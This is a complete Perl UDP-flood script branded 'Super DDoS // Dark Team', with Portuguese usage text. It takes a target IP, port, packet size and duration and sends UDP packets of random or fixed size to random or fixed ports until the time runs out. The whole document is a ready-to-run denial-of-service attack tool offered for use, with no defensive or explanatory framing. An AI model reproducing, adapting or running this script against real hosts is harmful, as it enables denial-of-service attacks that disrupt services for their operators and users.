#!/usr/bin/perl
 
##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";
  print "Super DDoS // Dark Team\n\n";
  print "Comando: dark.pl <ip> <porta> <pacotes> <tempo(em segundos)>\n";
  print " port: A porta para Flood. Coloque 0 para todos.\n";
  print " packets: O numero de pacotes a enviar. Entre 64 e 65500.\n";
  print " tempo: tempo de Flood em segundos.\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Impossível de se conectar ao $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Atacando $ip com a porta " . ($port ? $port : "random") . ", enviando a " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " para $time secondes" : "") . "\n";
print "Parar ataque com Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}